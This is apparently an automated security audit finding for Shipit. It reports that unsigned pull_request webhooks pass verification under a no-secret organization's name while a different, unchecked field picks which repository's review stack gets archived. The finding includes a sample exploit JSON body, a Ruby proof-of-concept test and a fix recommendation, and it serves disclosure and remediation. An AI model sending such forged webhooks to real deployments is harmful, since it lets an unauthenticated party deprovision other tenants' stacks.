### Title
Cross-repository `ClosedHandler` state mutation via unverified `repository.full_name` vs. signature-checked `repository.owner.login` mismatch - ([File: app/controllers/shipit/webhooks_controller.rb], [File: app/models/shipit/webhooks/handlers/pull_request/closed_handler.rb])

### Summary
`Shipit::WebhooksController#verify_signature` selects the `GitHubApp` (and thus the HMAC secret) using `repository.owner.login` from the JSON body, and accepts the request unsigned when that org's config has a blank `webhook_secret` (`GitHubApp#verify_webhook_signature` returns `true` unless `webhook_secret` is present). `ClosedHandler` then resolves the target `Repository`/`ReviewStack` using a *different* field from the same attacker-controlled body — `params.repository.full_name` — with no check that it matches the org used for authentication. This lets a payload "authenticated" against a no-secret org archive a `ReviewStack` belonging to any other repository the attacker names.

### Finding Description
The broken binding: the code implicitly assumes `params.dig('repository','owner','login') == params.dig('repository','full_name').split('/').first`, i.e. that the org used to select the verification secret is the same org whose data gets mutated. This is never enforced.

Path:
1. `WebhooksController#verify_signature` computes `repository_owner = params.dig('repository', 'owner', 'login')` [1](#0-0) , then does `Shipit.github(organization: repository_owner)` and calls `verify_webhook_signature` [2](#0-1) .
2. `GitHubApp#verify_webhook_signature` returns `true` immediately when `@webhook_secret` (from that org's config) is blank [3](#0-2) . This is the "no-secret organization" precondition supplied by the question — a pre-existing Shipit org config with no `webhook_secret` — and it is treated as given.
3. Once past this gate, `WebhooksController#create` dispatches the *entire raw JSON body* (attacker-controlled) to the handler chain [4](#0-3) .
4. `ClosedHandler#repository` resolves the target repo via `Shipit::Repository.from_github_repo_name(params.repository.full_name)` [5](#0-4) , which does a DB lookup by `owner`/`name` split from `full_name` [6](#0-5) . Nothing ties this lookup back to `repository_owner` used in step 1.
5. `review_stack` scopes to `repository.review_stacks` and finds the stack by `environment == "pr#{params.number}"` [7](#0-6) [8](#0-7) . `process` calls `review_stack.archive!` whenever `action == "closed"` [9](#0-8) , which deprovisions and archives the matched `Stack` [10](#0-9) .

Exploit request: attacker POSTs to `/webhooks` with header `X-Github-Event: pull_request`, body:
```json
{
  "action": "closed",
  "number": 42,
  "pull_request": { ... "head": {"sha": "<shared sha>", "ref": "..."} ... },
  "repository": {"owner": {"login": "no-secret-org"}, "full_name": "victim-org/victim-repo"},
  "sender": {"login": "attacker"}
}
```
`repository_owner` for signature purposes is `no-secret-org` (unsigned request accepted), but the actual DB lookup targets `victim-org/victim-repo`'s PR #42 review stack, which gets archived (deprovisioned) — a payload from one tenant's authentication context mutating another repository's stack.

Regarding the "shared commit SHA" framing in the question specifically: `ClosedHandler` does not perform any lookup by bare SHA at all — the stack is found purely by `environment = "pr#{params.number}"` scoped to the resolved `Repository`, not by commit SHA [7](#0-6) . So a "shared commit SHA with attacker repo" is not a necessary amplifier for this particular handler — the `repository.full_name`-vs-`owner.login` mismatch alone is sufficient to redirect the archive to any repository/PR-number pair the attacker names, as long as that repository exists in Shipit's DB. This is a stronger and simpler path than the one described, but it confirms the underlying invariant break the question is pointing at: verification org ≠ mutated repository.

Existing guards do not close this gap: `drop_unhandled_event` only filters unregistered event types [11](#0-10) ; the `ExplicitParameters` schema in `ClosedHandler.params` validates types/presence only, not cross-field consistency [12](#0-11) ; `Repository` validations only constrain owner/name character sets, not that the repository's owner matches the webhook's authenticating org [13](#0-12) .

### Impact Explanation
An attacker who controls (or names) a GitHub organization that happens to be configured in Shipit without a `webhook_secret` can send a completely unsigned webhook naming any other repository's `full_name` and PR number, causing Shipit to archive and deprovision that victim repository's review stack — a cross-repository state mutation triggered by a payload that never authenticated against the victim's own secret. This matches the "payload for one repository mutating another's stack" Critical category. It is repeatable against any PR number / repository pair that exists in Shipit's database, and other `pull_request` handlers (`OpenedHandler`, `LabeledHandler`, `ReopenedHandler`, etc.) share the identical `Repository.from_github_repo_name(params.repository.full_name)` pattern, so the same primitive extends to creating/unarchiving/labeling review stacks on arbitrary repositories, not just closing them.

### Likelihood Explanation
Requires the pre-existing misconfiguration described in the question: at least one GitHub organization configured in Shipit (`Shipit.github(organization: ...)`) with a blank `webhook_secret`. Given that precondition, the attack costs a single unauthenticated HTTP POST with no GitHub-side action required at all (the attacker doesn't even need to control a real GitHub org — they only need to know/guess the name of a no-secret org already configured in the target Shipit instance, plus the victim's `owner/repo` and PR number, both of which are public/discoverable). This is fully repeatable and requires no privileged Shipit role.

### Recommendation
In `WebhooksController#verify_signature`, or in each handler, enforce that the repository record resolved for mutation (`params.repository.full_name`) belongs to the same organization (`params.repository.owner.login`) that was used to select the verifying `GitHubApp`/secret. Additionally, treat a blank/missing `webhook_secret` for a configured organization as a hard misconfiguration error (reject the webhook) rather than as an implicit "skip verification" bypass.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_test.rb (proof)
test "pull_request closed with owner.login=no-secret-org but full_name=victim/repo archives victim stack" do
  no_secret_org = "no-secret-org" # configured in Shipit.github, webhook_secret blank
  victim_repo = shipit_repositories(:shipit) # owner/name = victim-org/victim-repo
  victim_stack = shipit_review_stacks(:review_stack) # environment: "pr42", repository: victim_repo

  refute victim_stack.archived?

  body = {
    action: "closed",
    number: 42,
    pull_request: {
      id: 1, number: 42, url: "x", title: "x", state: "closed",
      additions: 1, deletions: 1,
      head: { sha: "deadbeef", ref: "feature" },
      user: { login: "attacker" },
      assignees: [], labels: []
    },
    repository: { owner: { login: no_secret_org }, full_name: victim_repo.full_name },
    sender: { login: "attacker" }
  }.to_json

  post :create, body: body, params: {}, headers: { "X-Github-Event" => "pull_request" }
  # no X-Hub-Signature header sent at all -- request still succeeds because no_secret_org has no webhook_secret

  assert_response :ok
  assert victim_stack.reload.archived?, "victim repo's review stack was archived by an unsigned webhook authenticated as a different org"
end
```
This demonstrates that `repository_owner` (used for `verify_signature`) and `params.repository.full_name` (used by `ClosedHandler` for the actual DB mutation) are independently attacker-controlled and never cross-checked, allowing the equality `authenticating_org == mutated_repository_owner` to be violated.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L10-15)
```ruby
    def create
      params = JSON.parse(request.raw_post)
      Shipit::Webhooks.for_event(event).each { |handler| handler.call(params) }

      head(:ok)
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L19-22)
```ruby
    def drop_unhandled_event
      # Acknowledge, but do nothing
      head(204) unless Shipit::Webhooks.for_event(event).present?
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-77)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret
```

**File:** app/models/shipit/webhooks/handlers/pull_request/closed_handler.rb (L8-39)
```ruby
          params do
            requires :action, String
            requires :number, Integer
            requires :pull_request do
              requires :id, Integer
              requires :number, Integer
              requires :url, String
              requires :title, String
              requires :state, String
              requires :additions, Integer
              requires :deletions, Integer
              requires :head do
                requires :sha, String
                requires :ref, String
              end
              requires :user do
                requires :login, String
              end
              requires :assignees, Array do
                requires :login, String
              end
              requires :labels, Array do
                requires :name, String
              end
            end
            requires :repository do
              requires :full_name, String
            end
            requires :sender do
              requires :login, String
            end
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/closed_handler.rb (L41-45)
```ruby
          def process
            return unless respond_to_pull_request_closed?

            review_stack.archive!
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/closed_handler.rb (L49-53)
```ruby
          def repository
            @repository ||=
              Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
              Shipit::NullRepository.new
          end
```

**File:** app/models/shipit/repository.rb (L41-45)
```ruby
    validates :name, uniqueness: { scope: %i[owner], case_sensitive: false,
                                   message: 'cannot be used more than once' }
    validates :owner, :name, presence: true, ascii_only: true
    validates :owner, format: { with: /\A[a-z0-9_\-.]+\z/ }, length: { maximum: OWNER_MAX_SIZE }
    validates :name, format: { with: /\A[a-z0-9_\-.]+\z/ }, length: { maximum: NAME_MAX_SIZE }
```

**File:** app/models/shipit/repository.rb (L53-56)
```ruby
    def self.from_github_repo_name(github_repo_name)
      repo_owner, repo_name = github_repo_name.downcase.split('/')
      find_by(owner: repo_owner, name: repo_name)
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L15-17)
```ruby
          def stack
            @stack ||= scope.find_by(environment:)
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L23-35)
```ruby
          def archive!(*args, &block)
            if stack.blank?
              Rails.logger.info(
                "Processing #{action} event for #{repo_name} PR #{pr_number} but no Stack exists. Ignoring."
              )
              return true
            end
            return if stack.archived?

            stack.remove_from_provisioning_queue
            stack.deprovision
            stack.archive!(user, *args, &block)
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L96-98)
```ruby
          def environment
            "pr#{params.number}"
          end
```
